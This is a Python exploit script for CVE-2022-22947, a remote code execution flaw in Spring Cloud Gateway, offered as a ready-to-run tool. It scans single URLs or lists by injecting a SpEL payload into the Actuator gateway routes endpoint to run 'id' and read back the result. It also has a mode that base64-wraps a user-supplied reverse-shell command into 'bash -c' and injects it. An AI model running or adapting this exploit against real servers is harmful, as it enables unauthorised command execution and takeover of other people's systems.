#!/usr/bin/env python
# encoding: utf-8
'''
@Author         : ly613313
@Date           : 2022-08-01 09:13
@Description    : Spring-Cloud-Gateway-CVE-2022-22947.
'''

import argparse
import requests
import sys
import re
import base64
from urllib import parse as urlparse
import json
from termcolor import cprint
import time

def gettime():
    return time.strftime("[ %Y-%m-%d %H:%M:%S ]", time.localtime())

cprint(gettime()+"""    CVE-2022-22947 - Spring-Cloud-Gateway-RCE
    _____________   _______________         _______________   ________ ________  
\_   ___ \   \ /   /\_   _____/         \_____  \   _  \  \_____  \\\\_____  \ 
/    \  \/\   Y   /  |    __)_   ______  /  ____/  /_\  \  /  ____/ /  ____/ 
\     \____\     /   |        \ /_____/ /       \  \_/   \/       \/       \ 
 \______  / \___/   /_______  /         \_______ \_____  /\_______ \_______ \\
        \/                  \/                  \/     \/         \/       \/
         ________ ________  ________  ______________   ____  ___________   
         \_____  \\\\_____  \/   __   \/  |  \______  \  \   \/  /\______ \  
  ______  /  ____/ /  ____/\____    /   |  |_  /    /   \     /  |    |  \ 
 /_____/ /       \/       \   /    /    ^   / /    /    /     \  |    `   \\
         \_______ \_______ \ /____/\____   | /____/____/___/\  \/_______  /
                 \/       \/            |__|     /_____/     \_/        \/ 
Author : ly613313
Github :      

""", "magenta")

if len(sys.argv) <= 1:
    print('\n%s Please input the -h for help.' % (sys.argv[0]))
    exit(0)

headers1 = {
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Content-Type': 'application/json'
}

headers2 = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
    }


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",
                    dest="url",
                    help="Check a single URL.",
                    action='store')
parser.add_argument("-a", "--attack",
                    dest="shell",
                    help="the cmd of reverse shell",
                    action='store')
parser.add_argument("-l", "--list",
                    dest="urlslist",
                    help="Check a list of URLs.",
                    action='store')    
args = parser.parse_args()


def scan_url(url):
    payload = '''{\r
    "id": "hacktest",\r
    "filters": [{\r
    "name": "AddResponseHeader",\r
    "args": {"name": "Result","value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"id\\\"}).getInputStream()))}"}\r
    }],\r
    "uri": "http://example.com",\r
    "order": 0\r
    }'''
    res1 = requests.post(url=url + "/actuator/gateway/routes/hacktest",data=payload,headers=headers1,json=json)
    res2 = requests.post(url=url + "/actuator/gateway/refresh" ,headers=headers2)
    res3 = requests.get(url=url + "/actuator/gateway/routes/hacktest",headers=headers2)
    res4 = requests.delete(url=url + "/actuator/gateway/routes/hacktest",headers=headers2)
    res5 = requests.post(url=url + "/actuator/gateway/refresh" ,headers=headers2)
    if re.findall(r"Result = '.*']",res3.text)!=[]:
        context = re.findall(r"Result = '.*']",res3.text)
        cprint(gettime()+f" {url} Find", "red")
        cprint(gettime()+f" The result is : {context}" , "yellow")
    else:
        cprint(gettime()+f" {url} not Find", "blue")


def base64cmd(commond):
    shell = commond
    base64shell = base64.b64encode(shell.encode('utf-8'))
    rever_shell = "bash -c {echo,"+base64shell.decode('utf-8')+"}|{base64,-d}|{bash,-i}"
    return rever_shell


def revershell(url):
    commond = input(gettime()+" Please input your revserse shell cmd: \"): \n")
    if len(commond) == 0:
      print("Error!!!")
    else:
      shell = base64cmd(commond)
      print(shell)
      send(url,shell)


def send(url,commond):
    payload2 = '''{\r
      "id": "hacktest",\r
      "filters": [{\r
        "name": "AddResponseHeader",\r
        "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String(\\"%s\\")).getInputStream()))}"}\r
        }],\r
      "uri": "http://example.com",\r
      "order": 0\r
    }'''%commond
    print(payload2)
    res1 = requests.post(url=url + "/actuator/gateway/routes/hacktest",data=payload2,headers=headers1,json=json)
    res2 = requests.post(url=url + "/actuator/gateway/refresh" ,headers=headers2)
    if res2.text == '':
        cprint(gettime()+'Reverse shell Success!!!','green')


def main():
    urls = []
    if args.url:
        urls.append(args.url)
    if args.urlslist:
        with open(args.urlslist, "r") as f:
            for i in f.readlines():
                i = i.strip()
                if i == "" or i.startswith("#"):
                    continue
                urls.append(i)
    cprint(gettime()+" Start.......","green")
    for url in urls:
        cprint(gettime()+" Start scan the url :"+f"{url}......","green")
        result = scan_url(url)


if __name__ == "__main__":
    main()






